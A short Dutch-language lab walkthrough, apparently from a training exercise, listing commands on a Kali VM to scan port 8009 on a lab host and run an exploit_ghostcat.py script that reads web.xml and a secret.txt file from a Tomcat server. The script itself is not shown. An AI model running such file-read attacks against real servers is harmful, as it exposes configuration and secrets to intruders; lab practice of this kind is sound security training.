# Starten van de aanval

## 1) Stappen om de aanval succesvol uit te voeren (Kali VM)

- 4.1) Start de kali vm (indien deze nog niet aan staat):
- 4.2) zorg dat het exploit_ghostcat.py bestand op de kali vm staat
- 4.3) open terminal
- voer volgende commando's uit: 
- 4.4) sudo systemctl start ssh
- 4.5) sudo systemctl enable ssh
- 4.6) ga naar het pad waar het exploit_ghostcat.py bestand staat (bv Downloads -> cd Downloads)
- 4.8) chmod +x exploit_ghostcat.py
- 4.9) nmap 10.10.10.4 -p 8009
- 4.10) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/web.xml read
- 4.11) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/secret.txt read
